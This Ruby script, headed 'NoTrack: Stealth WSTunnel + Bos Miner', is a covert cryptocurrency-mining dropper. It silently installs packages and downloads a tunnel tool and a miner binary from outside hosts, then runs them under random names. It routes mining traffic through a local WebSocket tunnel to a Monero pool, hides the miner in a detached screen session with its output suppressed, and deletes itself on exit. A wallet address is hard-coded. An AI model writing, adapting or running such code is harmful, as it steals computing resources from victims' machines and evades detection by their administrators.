#!/usr/bin/env ruby
# NoTrack: Stealth WSTunnel + Bos Miner

require 'securerandom'
require 'fileutils'
require 'pathname'
require 'tempfile'

# --- CONFIGURATION ---
WSTUNNEL_URL = "https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz"
BOS_URL = "https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/bos"
MINER_WALLET = "89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY"
MINER_ALGO = "5" # Assuming this is the algo code
# --- END CONFIGURATION ---

# 1. Generate random names to avoid pattern matching
wstunnel_bin_name = SecureRandom.alphanumeric(8).downcase
bos_bin_name = SecureRandom.alphanumeric(8).downcase
tar_name = SecureRandom.alphanumeric(6).downcase

# 2. Define paths
tmp_dir = Dir.pwd
wstunnel_path = File.join(tmp_dir, wstunnel_bin_name)
bos_path = File.join(tmp_dir, bos_bin_name)
tar_path = File.join(tmp_dir, "#{tar_name}.tar.gz")
bos_dl_path = File.join(tmp_dir, bos_bin_name) # Download directly as bin

# 3. Generate Ports
ws_port = rand(10000..65000)
tcp_port = rand(10000..65000)

# 4. Self-Deletion Function
def self_delete(script_path)
  File.delete(script_path) if File.exist?(script_path)
  # Kill self if still running
  Process.kill("TERM", Process.pid) rescue nil
end

# 5. Quiet Install Function
def quiet_system(cmd)
  system("/bin/bash -c 'exec #{cmd} > /dev/null 2>&1'")
end

# 6. Cleanup Trap
at_exit do
  # Kill children if the script exits unexpectedly
  Process.kill("TERM", Process.pid) rescue nil
  # Delete temp files
  [tar_path, bos_dl_path].each do |f|
    File.delete(f) if File.exist?(f)
  end
  # Self delete
  self_delete(__FILE__)
end

# 7. Install Dependencies (Quietly)
quiet_system("apt-get update > /dev/null 2>&1 && apt-get install -y screen curl > /dev/null 2>&1")

# 8. Download Binaries
# Download WSTunnel
unless File.exist?(wstunnel_path)
  quiet_system("curl -sL -o #{tar_path} #{WSTUNNEL_URL}")
  if File.exist?(tar_path)
    quiet_system("tar -xf #{tar_path} -C #{tmp_dir} 2>/dev/null")
    # Find the extracted binary (usually 'wstunnel')
    extracted_bin = File.join(tmp_dir, "wstunnel")
    if File.exist?(extracted_bin)
      File.rename(extracted_bin, wstunnel_path)
    else
      # Fallback: check if it's already in the tarball with a different name
      # For simplicity, we assume standard wstunnel binary name
      puts "Warning: wstunnel binary not found in tarball"
    end
    File.delete(tar_path) if File.exist?(tar_path)
  else
    puts "Warning: Failed to download wstunnel"
  end
end

# Download Bos
unless File.exist?(bos_path)
  quiet_system("curl -sL -o #{bos_dl_path} #{BOS_URL}")
  if File.exist?(bos_dl_path)
    File.rename(bos_dl_path, bos_path)
  else
    puts "Warning: Failed to download bos"
  end
end

# 9. Set Permissions
FileUtils.chmod('+x', [wstunnel_path, bos_path]) if File.exist?(wstunnel_path) && File.exist?(bos_path)

# 10. Start Services

# Start WSTunnel Server
server_cmd = "nohup ./#{wstunnel_bin_name} server ws://127.0.0.1:#{ws_port} > /dev/null 2>&1 &"
quiet_system(server_cmd)

# Start WSTunnel Client
client_cmd = "nohup ./#{wstunnel_bin_name} client -L tcp://127.0.0.1:#{tcp_port}:xmr.kryptex.network:7029 ws://127.0.0.1:#{ws_port} > /dev/null 2>&1 &"
quiet_system(client_cmd)

# Start Miner in Screen
# Camouflage: Name the screen session 'node' or 'nginx'
screen_name = SecureRandom.alphanumeric(5).downcase
miner_cmd = "nohup screen -dmS #{screen_name} ./#{bos_bin_name} -o 127.0.0.1:#{tcp_port} -u #{MINER_WALLET} -t #{MINER_ALGO} > /dev/null 2>&1 &"
quiet_system(miner_cmd)

# 11. Wait a bit to ensure processes start
sleep 2

# 12. Optional: Keep script alive to monitor, or just exit and let self-delete trigger
# If we want a simple counter without blocking the terminal too much:
loop do
  print "\r\033[KUptime: #{Time.now.strftime('%H:%M:%S')} | WS: #{ws_port} | TCP: #{tcp_port}"
  sleep 10
end
